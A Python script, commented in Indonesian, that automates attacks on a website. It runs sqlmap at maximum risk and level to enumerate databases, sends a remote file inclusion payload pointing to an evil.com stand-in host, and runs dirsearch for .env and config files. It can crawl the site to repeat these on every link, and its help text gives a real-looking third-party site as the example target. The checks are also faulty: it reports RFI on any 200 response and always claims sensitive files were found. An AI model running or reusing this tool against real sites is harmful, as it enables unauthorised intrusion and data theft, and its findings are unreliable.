import requests
import argparse
import subprocess
import logging
from urllib.parse import urlparse, urljoin
from bs4 import BeautifulSoup
import time
from tqdm import tqdm  # Import tqdm untuk progress bar

# Setup logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger()

# Fungsi untuk mengecek SQL Injection menggunakan SQLMap (Live Output)
def check_sql_injection(url, verbose=False):
    logger.info(f"Memulai pemindaian SQL Injection di {url}...")
    try:
        # Menjalankan SQLMap dengan live output
        process = subprocess.Popen(
            ["sqlmap", "-u", url, "--batch", "--risk=3", "--level=5", "--threads=10", "--dbs"],
            stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True
        )
        
        # Menampilkan output secara langsung (live)
        for line in process.stdout:
            if verbose:
                logger.info(line.strip())  # Menampilkan output secara langsung
        for line in process.stderr:
            logger.error(line.strip())  # Menampilkan error secara langsung
        
        process.wait()  # Tunggu sampai proses selesai
        logger.info(f"SQL Injection diuji di {url}.")
    except Exception as e:
        logger.error(f"Error saat menjalankan SQLMap di {url}: {e}")

# Fungsi untuk mengecek RFI menggunakan Burp Suite atau ZAP (Live Output)
def check_rfi(url, verbose=False):
    logger.info(f"Memulai pemindaian Remote File Inclusion (RFI) di {url}...")
    
    # Menambahkan payload RFI (contoh: mencoba URL eksternal)
    rfi_payload = "?page=http://evil.com/maliciousfile.php"
    test_url = urljoin(url, rfi_payload)
    try:
        response = requests.get(test_url, timeout=10)
        if response.status_code == 200:
            if verbose:
                logger.info(f"RFI ditemukan di URL: {test_url}")
            else:
                logger.info(f"RFI ditemukan di {test_url}.")
        else:
            logger.warning(f"RFI tidak ditemukan di {test_url}.")
    except requests.exceptions.RequestException as e:
        logger.error(f"Gagal mengakses URL RFI {test_url}: {e}")

# Fungsi untuk mencari file sensitif menggunakan Dirsearch (Live Output)
def check_sensitive_files(url, verbose=False):
    logger.info(f"Memulai pemindaian file sensitif di {url}...")
    
    try:
        # Menjalankan Dirsearch dengan live output
        process = subprocess.Popen(
            ["dirsearch", "-u", url, "-e", "php,html,txt,env,config"],
            stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True
        )
        
        # Menampilkan output secara langsung (live)
        for line in process.stdout:
            if verbose:
                logger.info(line.strip())  # Menampilkan output secara langsung
        for line in process.stderr:
            logger.error(line.strip())  # Menampilkan error secara langsung
        
        process.wait()  # Tunggu sampai proses selesai
        logger.info(f"File sensitif ditemukan di {url}.")
    except Exception as e:
        logger.error(f"Error saat menjalankan Dirsearch di {url}: {e}")

# Fungsi untuk mengambil semua tautan dari halaman dan melakukan crawling
def crawl_site(url, visited_urls, verbose=False):
    logger.info(f"Crawling halaman: {url}")
    try:
        response = requests.get(url, timeout=10)
        soup = BeautifulSoup(response.text, 'html.parser')

        # Temukan semua link pada halaman
        links = [urljoin(url, link.get('href')) for link in soup.find_all('a', href=True)]

        # Filter untuk URL yang belum dikunjungi
        new_links = [link for link in links if link not in visited_urls and link.startswith(url)]
        logger.info(f"Menemukan {len(new_links)} link baru di {url}.")

        # Menampilkan progress bar untuk crawling
        for link in tqdm(new_links, desc=f"Crawling {url}", unit="link", ncols=100):
            visited_urls.add(link)
            logger.info(f"Memeriksa URL: {link}")
            start_scan(link, verbose)  # Pemindaian terhadap halaman yang ditemukan
            time.sleep(1)  # Untuk menghindari terlalu banyak permintaan dalam waktu singkat
    except requests.exceptions.RequestException as e:
        logger.error(f"Gagal mengakses URL {url}: {e}")

# Fungsi utama untuk memulai pemindaian
def start_scan(url, verbose=False):
    logger.info(f"Memulai pemindaian di {url}...")
    
    # Progress bar untuk setiap task
    tasks = [
        ("SQL Injection", check_sql_injection),
        ("RFI", check_rfi),
        ("Sensitive Files", check_sensitive_files)
    ]
    
    for task_name, task_function in tasks:
        logger.info(f"Memulai {task_name} di {url}...")
        # Progress bar untuk setiap task, misalnya 1 task untuk SQLi
        for _ in tqdm(range(1), desc=task_name, unit="task", ncols=100):
            task_function(url, verbose)

# Fungsi untuk menangani argumen dari command line
def main():
    parser = argparse.ArgumentParser(description="Scanner Keamanan Web untuk SQLi, RFI, File Sensitif, dan Crawling")
    parser.add_argument("url", help="URL situs yang ingin dipindai (contoh: http://bisnis.lrtjakarta.co.id)")
    parser.add_argument("--verbose", help="Menampilkan informasi rinci selama pemindaian", action="store_true")
    parser.add_argument("--crawl", help="Mengaktifkan fungsi crawling ke subfolder", action="store_true")
    args = parser.parse_args()

    # Mulai pemindaian pada URL utama
    visited_urls = set()  # Set untuk menyimpan URL yang sudah dikunjungi

    if args.crawl:
        # Jika opsi crawling diaktifkan, mulai crawling
        crawl_site(args.url, visited_urls, args.verbose)
    else:
        # Jika opsi crawling tidak diaktifkan, lakukan pemindaian biasa
        start_scan(args.url, args.verbose)

if __name__ == "__main__":
    main()
